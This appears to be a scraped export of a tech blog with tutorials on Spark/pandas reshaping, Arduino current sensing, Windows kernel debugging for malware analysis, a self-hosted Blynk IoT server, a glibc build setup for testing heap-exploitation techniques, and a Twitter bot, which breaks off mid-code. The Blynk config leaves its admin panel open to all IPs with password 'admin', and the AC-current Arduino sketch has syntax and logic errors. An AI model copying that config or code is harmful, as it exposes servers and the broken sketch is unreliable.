pivot function is suppose to be used on column with categorical values. In case of our example, we applied in on quarter column which has all categorical values. Melt operation on dataMelt transformation is opposite of of pivot transformation. With this operation data is converted from wide(unstacked) format to stacked/long format. Pivot operation help you to give a quick overview(tabular view) of the data, which is good for human analysis but difficult to do complex operations like grouping, etc. While the tables in wide format are to pretty to summarize data but difficult for analysis that where melt operation help us. Lets take and example of pewforum.org Income data of various religious group in the US. Tabular view of the data is as follows religion &lt;$10k $10-20k $20-30k $30-40k $40-50k $50-75k $75-100k $100-150k &gt;150k Agnostic 27 34 60 81 76 137 122 109 84 Atheist 12 27 37 52 35 70 73 59 74 Buddhist 27 21 30 34 33 58 62 39 53 Catholic 418 617 732 670 638 1116 949 792 633 This table gives a good summarization of income of a particular religious group, but it would be good to have table with three column religion income and number of individual for that income, this format can help us to do some complex analysis like grouping the table by income category and finding which religious tradition is missing or present in a particular income category. Melt in SparkMelt operation API is not provided by spark, but its not that difficult to create this operation. Below is the code to that implementations the melt function. 123456789101112131415161718192021from pyspark.sql.functions import array, col, explode, lit, structfrom pyspark.sql import DataFramefrom typing import Iterabledef melt_df( df: DataFrame, id_vars: Iterable[str], value_vars: Iterable[str], var_name: str=&quot;variable&quot;, value_name: str=&quot;value&quot;) -&gt; DataFrame: &quot;&quot;&quot;Convert :class:`DataFrame` from wide to long format.&quot;&quot;&quot; # Create array&lt;struct&lt;variable: str, value: ...&gt;&gt; _vars_and_vals = array(*( struct(lit(c).alias(var_name), col(c).alias(value_name)) for c in value_vars)) # Add to the DataFrame and explode _tmp = df.withColumn(&quot;_vars_and_vals&quot;, explode(_vars_and_vals)) cols = id_vars + [ col(&quot;_vars_and_vals&quot;)[x].alias(x) for x in [var_name, value_name]] return _tmp.select(*cols) lets try the apply melt_df function on the religions group income dataset. melt_df function takes five parameters: df : The Dataframe on which the operation will be carried out. id_vars : array of columns which will be the index to which the values of the columns to which matched to. In out example religion is the only id_vars, as we want to map it to various income class. value_vars: while id_vars help use to find the index of the values, this is the actual values will be extracted from these columns. var_name: the name of the variable column in the resulting DataFrame. value_name: this is the name of the value variable in the resulting DataFrame. 12345678910111213141516171819202122from pyspark.sql import SQLContextsqlContext = SQLContext(sc)# create RDD for productsdata = sc.parallelize([ ['Agnostic' ,27,34,60,81,76,137,122,109,84], ['Atheist',12,27,37,52,35,70,73,59,74], ['Buddhist',27,21,30,34,33,58,62,39,53], ['Catholic',418,617,732,670,638,1116,949,792,633], ])# column headerstable_columns = [&quot;religion&quot;,&quot;&lt;$10k&quot;,&quot;$10-20k&quot;,&quot;$20-30k&quot;,&quot;$30-40k&quot;, &quot;$40-50k&quot;,&quot;$50-75k&quot;,&quot;$75-100k&quot;,&quot;$100-150k&quot;,&quot;&gt;150k&quot;]#create the DataFramedf_rel_trad = sqlContext.createDataFrame(data, table_columns)df_rel = melt_df(df_rel_trad, ['religion'], table_columns[1:10], 'income', 'count')df_rel.show() The above code will give the output as shown in below table religion income count Agnostic &lt;$10k 27 Agnostic $10-20k 34 Agnostic $75-100k 122 Agnostic &gt;150k 84 Atheist &lt;$10k 12 Atheist $10-20k 27 Atheist $100-150k 59 Atheist &gt;150k 74 … … … Buddhist &lt;$10k 27 Buddhist $10-20k 21 Melt in pandaspandas provides melt operator which is the snippet as below the parameters are same as explained previously. In the below example we have create a pandas dataframe and the applied melt operation the results are the same for the previous example. 12345678910111213# religious_df is the dataframe which stores above tableIn [1]: value_variables = ['Less than $30000','$30000-$49999','$50000-$99999','$100000 or more']In [2]: religious_df = religious_df.melt(id_vars=['Religious tradition'], value_vars=value_variables)In [3]: religious_df[religious_df['Religious tradition'] == 'Buddhist']Out[3]: Religious tradition variable value 0 Buddhist Less than $30000 36 12 Buddhist $30000-$49999 18 24 Buddhist $50000-$99999 32 36 Buddhist $100000 or more 13 ConclusionWe just saw how to implement the pivot and melt transformation which reshapes the DataFrame. To summarize what we have learnt pivot operation can be helpful to quickly summerize the table in tabular format which is easy for the human analysis. While on contrast data is tabular format is not quite helpful for complex analysis, this is where this melt operation converts the table from wide format to long format. There is quite a bit to say about which format is suitable in what situation which is topic of this post, I have discussed the details of various heustics of tidying the data. Useful Links Spark Pivot API docs Databricks blog on pivot Stackoverflow anwser of pyspark melt operation","link":"/2018/03/25/reshaping-dataframe-using-pivot-and-melt-in-apache-spark-and-pandas/"},{"title":"Sensing current using Hall Effect Current sensor ACS712 and Arduino","text":"Browsing through Arduino projects on the internet recently I came across ACS712 current Hall sensor which can be used to measure current, it can measure both AC and DC current.I found it pretty cool so I ordered one, this post is about how we can measure AC/DC current consumed by the load connected to the power supply. So of the other applications of the sensor that comes to my mind are sensing if a device is on/off, measure instability in power supply, motor control, over current fault protection, etc. Features list includes Low-noise analog signal path Device bandwidth is set via the new FILTER pin 5 µs output rise time in response to step input current 80 kHz bandwidth Total output error 1.5% at TA = 25°C Small footprint, low-profile SOIC8 package 1.2 mΩ internal conductor resistance 2.1 kVRMS minimum isolation voltage from pins 1-4 to pins 5-8 5.0 V, single supply operation 66 to 185 mV/A output sensitivity Output voltage proportional to AC or DC currents Factory-trimmed for accuracy Extremely stable output offset voltage Nearly zero magnetic hysteresis Ratiometric output from supply voltage Required Components: Arduino Uno Current Hall Sensor ACS712 Breadboard Jumper wires About Hall Effect Current sensor ACS712The picture below identifies the pin outs for the ACS172 modules. The sensor consists of a linear Hall circuit with a copper conduction path located near the surface of the chip. When the device is turned on the applied current flowing through the copper conduction path which generates a magnetic field which the sensor converts into a linearly proportional voltage. This voltage is read through the Arduino analog pin which outputs 10-bit number (0-1023), from which the DC or AC current can be calculated. Table below give specification on the different version of the chip| | 5A Module | 20A Module | 30A Module ||—|—|—|—|| Supply Voltage (VCC) | 5Vdc Nominal | 5Vdc Nominal | 5Vdc Nominal || Measurement Range | -5 to +5 Amps | -20 to +20 Amps | -30 to +30 Amps || Voltage at 0A | VCC/2 (nominally 2.5Vdc) | VCC/2 (nominally 2.5Vdc) | VCC/2 (nominally 2.5VDC) || Scale Factor | 185 mV per Amp | 100 mV per Amp | 66 mV per Amp || Chip | ACS712ELC-05A | ACS712ELC-10A | ACS712ELC-30A | Sensor IC is electrically isolated from the terminals conducting path. This feature allows, applications requiring electrical isolation without the use of opto-isolators or other costly isolation techniques. The voltage reading on the Arduino analog pin by the sensor depends on the sensor’s rating. The ±5A sensor will output 185mV for each amp (mV/A), the ±20A 100mV/A and the ±30A 66mV/A. Accurately knowing the voltage is therefore pretty important. I bought 30A version so output will be 66mV/A. SchematicsThe connection of ACS712 with Arduino and load is shown below. Sensing DC CurrentSensing DC current is simple as there is no change in direction of current with it is as simple as reading the value from the Arduino’s analog pin to which sensor is connected. The code for the Arduino is below 1234567891011121314151617181920212223const int analog_IN = A0;int mv_per_amp = 66; // use 100 for 20A Module and 66 for 30A Moduleint raw_value= 0;int acs_offset = 2500;double voltage = 0;double amps = 0;void setup(){ Serial.begin(9600);}void loop(){ raw_value = analogRead(analog_IN); voltage = (raw_value / 1024.0) * 5000; // Gets you mV amps = ((voltage - acs_offset) / mv_per_amp); Serial.print(&quot;Raw Value = &quot; ); // shows pre-scaled value Serial.print(raw_value); Serial.print(&quot;\\t mV = &quot;); // shows the voltage measured Serial.print(voltage, 3); Serial.print(&quot;\\t Amps = &quot;); // shows the current Serial.println(amps,3); delay(2500);} If your load used the DC power supply then you should use the code above to measure the current. Sensing AC CurrentSensing AC current is a bit complex as the direction is constantly reversing in each sinusoidal cycle so we will get different current value each time we read the value. Instead, we are interested in Root mean square Voltage (Vrms). With Arduino, we can continuously fetch readings from the analog pin for 1 second and get the highest reading in that interval. As the sin wave has a known frequency of 50/60 Hz sampling two waves will be good enough. This will give us peak voltage (Vp) in both(negative and positive) direction. RMS voltage can be calculated using peak voltage Vrms = Vp / √2. The code below reads samples for both minimum and maximum voltage for better accuracy, peak voltage Vp is the average of the absolute value of two voltages : 1234567891011121314151617181920212223242526272829303132333435363738394041424344const int sensor_IN = A0;//use 185 for 5A, 100 for 20A Module and 66 for 30A Moduleint mv_per_amp = 66double voltage = 0;double v_rms = 0;double amps_rms = 0;void setup(){ Serial.begin(9600);}void loop(){ voltage = getVPP(); v_rms = (voltage/2.0) * 0.707; amps_rms = (v_rms * 1000)/mv_per_amp; Serial.print(amps_rms); Serial.println(&quot; Amps RMS&quot;);}float getVPP(){ float result; int read_value; //value read from the sensor int max_value = 0; // store max value here int min_value = 1024; // store min value here uint32_t start_time = millis(); //sample for 1 Sec while((millis()-start_time) &lt; 1000) { read_value = analogRead(sensor_IN); // see if you have a new max_value if (read_value &gt; max_value){ /*record the maximum sensor value*/ max_value = read_value; } if (read_value &lt; min_value){ /*record the maximum sensor value*/ min_value = read_value; } // Subtract min from max result = ((max_value - min_value) * 0.5)/1024.0; return result; } ConclusionAs we saw the connecting the sensor was pretty simple but depending on the type of load connected to the sensor we have to process the output of the Arduino analog pin differently to get the correct output. Useful links Current Hall sensor ACS712-30Amp data sheet Must read More details on RMS voltage","link":"/2017/06/21/sensing-current-using-hall-effect-current-sensor-and-arduino/"},{"title":"Setting up Windows 7 Machine for Kernel Debugging","text":"Recently when I was trying to debug a malicious Windows driver and I had to setup kernel debugging environment, there were various tutorial I found using various configuration VMware, network based. But I wanted something quick and dirty which is what my setup is. In this post we will create a kernel debugging environment for Windows 7. To do Kernel debugging you need two machines, one is the machine from which you will issue the debugging command and other machine which is been debugged. I will be talking about very specific setting i.e. two Windows 7 virtual machine in VirtualBox and the host will be Linux. You need to install WinDbg in the debugger machine. Basic terminologySince we are dealing with multiple machines we need to clear about their roles, which are as follows: Debugger Machine: Virtual machine with the standard version of Windows 7 that has WinDbg installed Debuggee Machine: Virtual machine with the Windows 7 Debug Checked build, following section shows you how to do that. Host Machine: Machine running the virtual machines, it could be Windows or Linux. Setting up the DebuggeeMaking the Boot EntryThere are some setting which needed to be done to make it kernel debuggeable. Start the command prompt with Administrator privilege otherwise you will get permission error, then execute the following command : Create Boot entry, there is a unique UUID for each Boot entry, you will need the newly created boot ID in the next few commands, so copy it. 1C:\\&gt; bcdedit /copy {current} /d &quot;Windows 7 with kernel debug via COM&quot; Turning on the debugger 1C:\\&gt; bcdedit /debug {UUID-RETURNED-BY-FIRST-COMMAND} ON Setting up the Baud rate and the COM port number to use 1C:\\&gt; bcdedit /dbgsettings serial debugport:1 baudrate:115200 Setting up the debug type as Serial COM port 1C:\\&gt; bcdedit /set {UUID-RETURNED-BY-FIRST-COMMAND} DEBUGTYPE SERIAL Verify the settings : once you have done above configuration. Type bcdedit command to get the list of all boot configuration. One of those several entry you should be able to see the settings as shown below. To verify the port and baudrate setting issue bcdedit /dbgsettings command which should give you following output. Power down this machine VirtualBox SettingGo to the setting of the VirtualBox Manager, click Settings -&gt; Serial Ports -&gt; Port 1. Check enable serial port. Port Number: COM1 Port Mode: Host Pipe DO NOT CHECK connect to existing pipe/socket Port/Address: this is the path of the pipename where the file will be created, this value depends upon the host OS which is as follows OS Value (pipename) Windows \\.\\pipe\\pipename Linux /tmp/pipename the above settings should look something like this in VirtualBox. Setting up the DebuggerGo to the setting of the VirtualBox Manager, click Settings -&gt; Serial Ports -&gt; Port 1. Check enable serial port. Port Number: COM1 Port Mode: Host Pipe CHECK connect to existing pipe/socket. Port/Address: this is the path of the pipename where the file will be created, this value depends upon the host OS which is as follows OS Value (pipename) Windows \\.\\pipe\\pipename Linux /tmp/pipename the above settings should look something like this in VirtualBox. Networking configurationNetwork settings are also important, all the machines(Host and Guests) should be able to ping each other. For this setting you can use Host-only adapter which allows all the VM machine and the Host machines to communicate with each other, but not to external network, consequently there will be no internet access on guest machines. On the Debugger Machine you will need will need internet to download the Kernel symbols, to fix this you can add additional network adapter with NAT enabled, this should give you internet access. Start the Debugger MachineFirst start the debugger machine, this will create the named serial port (pipename file). Debugger machine should be started first or else you will get error when starting the debuggee machine. Run WinDbg (GUI works fine, command line isn’t needed) Go to File -&gt; Kernel Debug -&gt; COM. configure the settings as shown below It should say Opened \\.\\com1 Waiting to reconnect… Starting the Debugee Machine Once you debugger has started and your WinDBG is setup with the kernel com port setting start the debuggee machine. Once you bootup the machine you should see the below boot menu. boot with the debugging enabled option. If the debuggee machine is connect to the debugger machine it will boot extremely slowly and stop on the “Starting Windows” screen. WinDbg on the debugger machine should be connected at this point. When you get the message that says “Break repeatedly, break Once, Ignore, terminate Process, or terminate Thread.” Give WinDbg the command “g” and windows should continue to boot. Trouble shooting tipsVerifing the Networking configurationNetwork settings are also important, all the machines(Host and Guests) should be able to ping each other. For this setting you can use Host-only adapter which allows all the VM machine and the Host machines to communicate with each other, but not to external network, consequently there will be no internet access on guest machines. On the Debugger Machine you will need will need internet to download the Kernel symbols, to fix this you can add additional network adapter with NAT enabled, this should give you internet access. Verifing the Serial Port SettingsIf you are facing issues with debuggee not connecting to the debugger then you can verify if there Serial port setting enabled on the machine. Go to Device Manager and check if there is serial port. If you can’t set the COM Port driver as below then you need to get it fixed somehow.","link":"/2018/10/10/setting-up-windows-7-for-kernel-debugging/"},{"title":"A simple DIY smart home IOT project","text":"In the previous article we connected Arduino UNO with ESP8266-01 and tried various AT commands to create an Access Point, making a connection to a Wifi Network, listening to the TCP port and passing message back and forth with AT commands. That was all basic tasting water, in the post we will step up the game and we will read sensor data from Arduino and send it to a central server and then will display that sensor data on the mobile client. For the purpose of demonstration, we will use DHT11 temperature and humidity sensor and will send temperature and humidity data to the central server. For the server and mobile client, we will use Blynk which is has a server which collects sensor data from various devices and there is also Blynk mobile client which you can create a dashboard with drag and drop interface and play around with visualization of the sensor data. Components required: Arduino Mega DHT11 sensor ESP8266-01 bread board Couple of jumper wires Flow of the dataOnce we get the big picture of the system it will be easy to understand all the moving parts. Arduino will read data from the DHT11 sensor and send temperature and humidity data to Blynk server. We need to create an application in a Blynk mobile app to get an Auth Token which will be used to authenticate the connected device(Arduino). Arduino will send data to the central server at regular interval (say every 3 sec), this is the push model where the sensor pushes the data to the server, we could also use the pull model where the server will ask the device for the data on demand, for example, we only want to read the sensor data when the mobile client wants to read the data not interested otherwise. We will use push model in this article. Blynk also has Arduino library which will send data to the server in an efficient manner which I will describe shortly. Setting up central serverYou cloud use Blynk hosted cloud server or you cloud setup your own, I create my own server is not really that much of a headache and plus you don’t compromise your privacy by sending your data to cloud. Just follow the step below. Download the server-.jar in a folder Paste the below configuration in server.properties file, place the config file in the same folder in which you downloaded the server-.jar 123456789101112131415https.port=9443http.port=8080data.folder=.tmp/blynklog.level=traceenable.raw.data.store=trueadmin.rootPath=/adminallowed.administrator.ips=0.0.0.0/0admin.email=admin@blynk.ccadmin.pass=adminhardware.default.port=8442hardware.ssl.port=8441server.ssl.cert=./server_embedded.crtserver.ssl.key=./server_embedded.pemserver.ssl.key.pass=pupkin123enable.raw.data.store=true Run the server with command shown in below 1java -jar server-0.25.3.jar -dataFolder .path -serverConfig server.properties Setting up the mobile client and getting the Auth Token If you are using your own server then you have to configure the Blynk mobile client to point to your server, or if you are using Blynk’s cloud server the simply sign up and create an app, auth token will be sent to you email address. Follow below steps to create a mobile app, steps are valid irrespective of, you host your own server or using the Blynk cloud. Create the application, choose device type as Arduino Mega and Connection type as WIFI Create New Project Choose Device type and Connection Type Get the Auth token by login into your local server by visiting this address https://127.0.0.1:9443/admin, or you could copy if from project setting of your mobile client and in case you are using Blynk cloud you must have got your auth token from in your email account. Connecting Arduino to central serverBelow is the pin dialog of the Arduino setup follow it carefully and double check it, I often make mistake in this part of the project. Upload this sketch to Arduino Mega we are using hardware serial1 for the communications with ESP8266-01, so be careful of the TX/RX pins of ESP8266 connecting to Arduino 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// this is to prints debug logs on serial console#define BLYNK_PRINT Serial// import the dht sensor library#include &lt;dht.h&gt;dht DHT;// data pin of the DHT11 as per the pin diagram#define DHT11_PIN 31#include &lt;ESP8266_Lib.h&gt;#include &lt;BlynkSimpleShieldEsp8266.h&gt;// You should get Auth Token in the Blynk App.// Go to the Project Settings (nut icon).char auth[] = &quot;&lt;AUTH TOKEN&gt;&quot;;// Your WiFi credentials.// Set password to &quot;&quot; for open networks.char ssid[] = &quot;&lt;WIFI_WHATEVER&gt;&quot;;char pass[] = &quot;&lt;MY_PASSWORD&gt;&quot;;#define EspSerial Serial1// Your ESP8266 baud rate:#define ESP8266_BAUD 115200ESP8266 wifi(&amp;EspSerial);BlynkTimer timer;void myTimerEvent(){ //read the temperature and humidity from the sensor int chk = DHT.read11(DHT11_PIN); // send temperature data on Virtual pin 3 Blynk.virtualWrite(3, DHT.temperature); // send humidity data on Virtual pin 4 Blynk.virtualWrite(4, DHT.humidity);}void setup(){ // Debug console Serial.begin(9600); // Set ESP8266 baud rate EspSerial.begin(ESP8266_BAUD); delay(1000); // I am host my own that local copy of blynk server Blynk.begin(auth, wifi, ssid, pass, &quot;&lt;IP address of blynk server&gt;&quot;, 8442); // send data every 5 seconds timer.setInterval(5000L, myTimerEvent);}void loop(){ Blynk.run(); timer.run(); // avoid delay() function!} You must have noticed the ‘myTimerEvent’ function which reads sensor data and send to the virtual pins, one must be thinking I could have done it in ‘loop’ function but doing that would flood the server, and the server would start dropping the data which is bad. ‘loop’ function run forever and we cannot predict at what interval data is sent to the server so Blynk provides a nice way of doing it by registering a timer function which is called at configured interval. If you are using your own Blynk setup then, your Arduino should be connecting to the same WiFi network on which your Blynk server resides. If you have made the connections properly and uploaded the code, next open up the serial console and set the baud rate to 9600 from the drop down in the bottom corner of the console and then you should be able to see the debug logs as shown below. 12345678910[999] ___ __ __ / _ )/ /_ _____ / /__ / _ / / // / _ \\/ '_/ /____/_/\\_, /_//_/_/\\_\\ /___/ v0.4.8 on Arduino Mega[1585] Connecting to ARPANET[2606] ESP is not responding[10081] Ready (ping: 20ms). Setup Mobile client dashboardCreating dashboard is very simple, you just have to drag and drop the widgets and configure which from which pin the widgets will show the data. In our case temperature data is sent on Blynk Virtual pin 3 and humidity data is sent on virtual pin 4. Virtual pin is the concept created by Blynk in their software ecosystem. It’s nothing complicated we just binding a particular data to a virtual pin in our case temperature to pin 3 and humidity to pin 4. Follow the below steps to create the dashboard: Open Widgets menu from the plus icon from the top left of the screen Add Widgets from the menu and make sure you properly configure them as shown below Temprature Gauge Widget Humidity Gauge Widget History Graph Widget : this Widget will show history of both temprature and humidity both in one graph time axis can be scaled. Button Widget : Arduino Mega has a on board led which can be controlled from digital PIN 13 Final dashboard: once you have configured all the widgets properly then click the play button on the top right corner of the app and see the dashboard in action. You can also see the device status on the top which shows if the device is online or when it was last online. ConclusionWe successfully connected sensor with the Arduino and managed to send sensor data to the central server via ESP8266 and show it on mobile client with very few lines of code. You can also extend this project to add more sensor and add more widgets in mobile client, Blynk’s mobile client has very pretty and easy to use interface with which you can also create rules to trigger some actions like send tweets/email or send high/low signal on other Arduino pins when certain conditions are meet.","link":"/2017/07/23/simple-DIY-smart-home-IOT-project/"},{"title":"Testing Linux Heap exploits on different Glibc version (with source-level debugging setup)","text":"Recently I am learning about Linux Heap exploitation and I came across some really good Phrack papers and blogs which explained different type of attacks in varying conditions, I have included the link of these blogs and papers in the next section. I also came across an amazing GitHub project How2Heap by shellpish team, this project has the example exploit code for various heap exploitation technique of different versions of Glibc out there in public, which help me to get a better understanding of how those attacks played out. That project also included a script to build Glibc with any version of your choice and test the exploit on that version. MotivationThere was a certain limitation to the building and testing of the exploit code in the which is included in the project, I couldn’t set an environment with source-level debugging with. To gain a deeper understanding of these exploitation techniques to inspected memory layout of the various Glibc data structure(chunks, bins and arena) as the exploits were progressing and to see have how manipulation of these data structure affects the control flow of the Glibc internal code. This is what this post will address, how to compile any version of Glibc and setup environment to do source debugging and link that particular version of Glibc with the how2heap sample exploit or any other exploit code. Heap Exploitation Phrack papers and blogsBelow are some of the excellent piece of document which might blow your mind with the depth of thinking these hackers have put in(I will keep updating this section, this is not the whole coverage yet). How2Heap Phrack Glibc Heap Attack Paper - straight from the underground MALLOC DES-MALEFICARUM Advanced Doug Lea’s malloc exploits Heap Exploitation Blogs Diving into glibc heap Book Understanding glibc Malloc Why is it so tricky? The method used in the project is to set the LD_PRELOAD env variable to the newly compiled version, with this variable your program will give your Glibc library precedence over default, this method is good to test in standalone exploit code but if you launch gdb with this option, gdb will load the newly compiled version of the due to this gdb can start behaving weird or might get crashed. The other thing you need to know is that Glibc is composed of some 200+ binaries that must all match exactly. Two key binaries are /lib/ld-linux.so and /lib/libc.so.6 (but there are many more: libpthread.so.0, libnsl.so.1, etc. etc). If some of these binaries came from different versions of Glibc, you usually get a crash. All in all, you have to make sure the only your program loads the Glibc you are experimenting with this exact version of libc.so matching with correct ld-linux.so binary. Building Glibc version with debug symbols Clone the Glibc source from URL git://sourceware.org/git/glibc.git. You can use git checkout to checkout to any Glibc version of your choice. Create a build directory and go to that directory. Please make a note of this path as it will be used later while compiling. If you are going to compile different version then make a build directory for each version, build_ will be good conversion to follow. If you want to disable tcache option then you will have to pass –disable-experimental-malloc option. Build command will look something like this &lt;glibc source drictory&gt;/configure --prefix=/usr [--disable-experimental-malloc]. Finally make command. Don’t do sudo make install this might replace your system Glibc file, highly not recommended Glibc is by default compiled with debug symbol ref so you don’t have to worry about doing any special here. When the binaries are deployed in the production environment, debug symbols are removed using strip command. How to build with custom Glibc buildOnce you have the compiled Glibc binaries, you can see all these binaries in the build directory, will use this path in the gcc compile command with is as follow. 12345gcc-Wl,--rpath=&lt;glibc build output path&gt;-Wl,--dynamic-linker &lt;glibc build output path&gt;/elf/ld-linux-x86-64.so.2-o &lt;output file name&gt;&lt;input file name&gt; What are these GCC option ? Here is a brief explanation of these options straight from the Linux manual man ld –rpath=dir Add a directory to the runtime library search path. This is used when linking an ELF executable with shared objects. All -rpath arguments are concatenated and passed to the runtime linker, which uses them to locate shared objects at runtime. The -rpath option is also used when locating shared objects which are needed by shared objects explicitly included in the link; –dynamic-linker=file Set the name of the dynamic linker. This is only meaningful when generating dynamically linked ELF executables. The default dynamic linker is normally correct; don’t use this unless you know what you are doing. Glibc version verificationHow do I know which Glibc version is been loading by my program? Lucky there is a method exposed by Glibc library with you can to get the version. Paste the code below in the start of you exploit code to be aware of the version of the Glibc version. 1234567891011#include &lt;gnu/libc-version.h&gt;void print_glibc_version () { printf(&quot;Using glibc version: &quot;); puts(gnu_get_libc_version ());}int main(){ print_glibc_version(); return 0;} GDB command primer for source debuggingBelow are some of the command which will assist you further with source debugging. Command Description list/l 247 List your source code at line 247 list/l myFunc List your source code of the starting function myFunc list/l hello_world.c:main check the source main function of this hello_world.c function call myFunc(myArgc) call function from gdb, useful to invoke function which print debug info print/p myVar Print the current value of myVar, you can also print most C expressions, e.g. myList[i] + 10, student.name. Note that #defined values don’t work. break/b 36 Set a breakpoint at line 36 of your code. break/b myFunc Set a breakpoint at the start of the function myFunc in your code. finish continue the execution till the end of the function I use gef plugin for gdb, which makes command-line debugging less painful, gef also has heap analysis plugin which prints the heap data structure(chunks, bins and arena) stored in the program memory at will. ConclusionI hope at this point you are all set to do digging into heap exploitation and this setup might also help you in CTF’s. You won’t be able to do exact expression evaluation for some of the code as some of it is lost(#define code) in optimization and pre-processing about 5% of the code or so, nothing of major concern. Happy Hacking. Reference GDB Source debugging","link":"/2019/09/15/testing-heap-exploit-on-different-glibc-verison/"},{"title":"Create a Twitter bot in 4 simple steps","text":"Bots are usually created to automate certain repeated task like you must be visiting your favourite website’s regularly to read the latest post instead you could create a Bot that notifies’s you with the URL of new content which you should check it out. As an example of such Bot, we will create Bot that aggregate memes from 9GAG and Reddit on post it on the Bots Twitter account. What this Bot will do? Fetch images from Reddit and 9GAG and tweet it at a regular interval (say 15 mins). When every we have new follower we will tweet him a friendly welcome message. What do you need? Twitter account - you have to login into developer portal to get credentials for bot Nodejs Redis (for message queue) - spam control will explain more on this. Third party npm packages like twit, bull etc. Step 1: Creating the twitter appIf you have a regular twitter account then you can log in at apps.twitter.com and create a new application. Once you have created the application go to permissions tab and select Read and Write permission. Then go to Keys and Access tokens tab, you have to copy following four keys Consume key Consumer Secret key Access Token Access Token Secret this tokens will be used by the twit library for authentication purpose otherwise you cannot send a tweet to your twitter account. Step 2: Now you have my permission to codeFirst, let’s create npm project and install necessary packages, we require twit package to interact with twitter API and bull as a message queue. You can clone the github repository of this project and get the code, and you can follow along to understand the project. Required npm packages : twit - Interact with twitter API bull - Redis backed message queue library feedparase - Parse 9GAG feeds cheerio - HTML parser Basic setup : Initialized the project with command npm init and fill the requested details Install the necessary packages for the project by using this command npm install --save twit Hello world tweet code. 12345678910111213141516171819202122var Twit = require(’twit’); /* fill this object with the keys you got from twitter dev account */var config = { consumer_key: '', consumer_secret: '', access_token: '', access_token_secret: ''}/* create instance */var Twitter = new Twit(config);/* post a tweet */Twitter.post('statuses/update', { status: 'hello world!' }, function(err, data, response) { if(err){ console.log('Error posting tweet') } else { console.log('Congrats! tweet posted') }}) Now that we can tweet programmatically our next task is to post some meaning full content, may some funny pic or some quotes, facts, etc. Which takes us to the next step. Step 3: Fetching the content for your BotWe will fetch 9GAG and Reddit feeds and extracts title and URL of memes from the feed. There is no official 9GAG RSS feeds but there are some other unofficial sources which can help us, feeds are in XML format which will be parsed using npm package feedparser. Feeds which we get in XML format still needs some cleaning so we use cheerio library to parse HTML tags and extract required text and image URL from the HTML content. Below is the code for fetching and parsing the feeds and added it to queue 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566var FeedParser = require('feedparser');var request = require('request');var feedparser = new FeedParser();var cheerio = require('cheerio');var gagFeedUrl = 'http://9gag-rss.com/api/rss/get?code=9GAG&amp;format=1';var req = request(gagFeedUrl)req.on('error', function (error) { console.log('Feed fetching', error)});// stream the response to feedparser, we don't have to wait for// entire response to arrivereq.on('response', function (res) { let stream = this; if (res.statusCode !== 200) { this.emit('error', new Error('Bad status code')); } else { // streaming the response stream.pipe(feedparser); }});// error handlingfeedparser.on('error', function (error) { console.log('Feed Error', error)});// parse response by feedparserfeedparser.on('readable', function () { let stream = this; let item, content = {}; while (item = stream.read()) { console.log('Reading feed'); // parsing the messy XML data content.title = cheerio.load(item.title).text(); $ = cheerio.load(item.description); links = $('img'); if ($(links).length != 0) { if ($(links).length != 0) { $(links).each(function (i, link) { content.url = $(link).attr('src'); }); } } else { links = $('source'); if ($(links).length != 0) { $(links).each(function (i, link) { content.url = $(link).attr('src'); }); } } console.log('Content : ', content) /* content object format constent = { url :'image_url', title: 'title of the meme' } */ }}); While Reddit, on the other hand, gives response in JSON format nothing much to do here just fetch the content and convert it into the content object as shown in above code. 123456789101112131415161718var request = require('request');var _ = require('lodash');/* fetch post in from format for funny sub-reddit */var redditUrl = 'https://www.reddit.com/r/funny.json';request.get({ method: 'GET', url: redditUrl, json: true}, function (err, body, data) { _.each(data.data.children, (post) =&gt; { let content = { url: post.data.url, title: post.data.title } console.log('Content : ',content) });} We will be fetching feeds at regular interval and frequency differs for different source, because in 9GAG content are posted very often as compared to Reddit and if we fetch the feeds too frequently then we will get same feeds(which is of no use) and also our IP might get flagged as spam so to avoid that we will fetch content from 9GAG every 30 min and from Reddit every 60 min. We should not tweet all the content which we fetch right away this will flood people’s timeline with our post’s following us or we might hit the Twitter API limit. So we have couple of problems at our hand that to solve: Fetch feeds from different source at different interval, interval may differ for each source Post tweets to twitter account at regular interval (say 15 mins) Persist the content object in case our program crashes To solve this we will use queues. There is a nice Redis back library for queue call bull. Addressing our first requirement bull has repeatable jobs feature which will send the same message to the queue at the defined interval. This message will trigger a callback function with the message as the parameter to the function and a callback function which will be called to notify bull that function is executed successfully so that error is not logged. And addressing our last requirement bull persist the messages in Redis so we don’t have to worry about parsed feeds lost due to the program crash.Once we have fetched the feeds from the Reddit and 9GAG we will push the parsed content to another queue call tweet_queue. Posting the message on tweet_queue will trigger a callback function which will tweet the image with the title. The code is shown below how it will be carried out. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556var Queue = require('bull');var redis_config = { 'port': 6379, 'host': '127.0.0.1'}/* create a queue */var nineGagQueue = new Queue('9gag_queue', redis_config);var tweetQueue = new Queue('tweet_queue', redis_config);var redditQueue = new Queue('reddit_queue', redis_config);/* actual processing of the queue message is done in this callback function */nineGagQueue.process((job, done) =&gt; { /* fetch feeds from 9GAG here * code to fetch the content is shown above * */ var content = { 'url': 'image url', 'title': 'post title' } // add content to twitter queue tweetQueue.add(content); done();});redditQueue.process((job, done) =&gt; { // fetch feeds from Reddit here // code to fetch the content is shown above var content = { 'url': 'image url', 'title': 'post title' } // add content to twitter queue tweetQueue.add(content); done();});/* add message to queue */nineGagQueue.add({ 'url': 'http://9gag-rss.com/api/rss/get?code=9GAG&amp;format=1'}, { repeat: { cron: '*/30 * * * *' }});redditQueue.add({ 'url': 'https://www.reddit.com/r/funny.json'}, { repeat: { cron: '6 */1 * * *' }}); Now that we have the Bot and the content we are the final stage making it work together. We also need to make our content to work for us just tweeting is not enough we also have to try getting noticed without spamming and irritating user. This takes us to the next step. Step 4: Getting your Bot noticedCreating Bot is not enough, we also need some discovery mechanism which will help our Bot get to discovered and gain some followers. One method is to have hashtags in tweets. The question is how do we generate meaningful hashtag? The title which we extract from the feed can be of some help. As the words of title hold some context to the image, choosing the word to hashtags form the title will be a sensible approach. But again there will be many words in the title, we won’t be hash tagging all the words only one or two. Heuristic to choose the word to hash tag is very simple just don’t tag stopwords and choose any other two words from the title text. There is a nice npm package stopword which has all the English stop words. Stopwords are the most frequent words in the language which contribute very little to the meaning of the sentence. They are usually the connecting words like a, the, etc. Code for tweeting and hashtagging word is as follows 123456789101112131415161718192021222324252627282930313233343536373839404142/* * this util method helps to upload the remote url directly to twitter */var uploadRemoteMedia = require('../utils').uploadRemoteMedia;var sw = require('stopword')var _ = require('lodash');tweetQueue.process(function 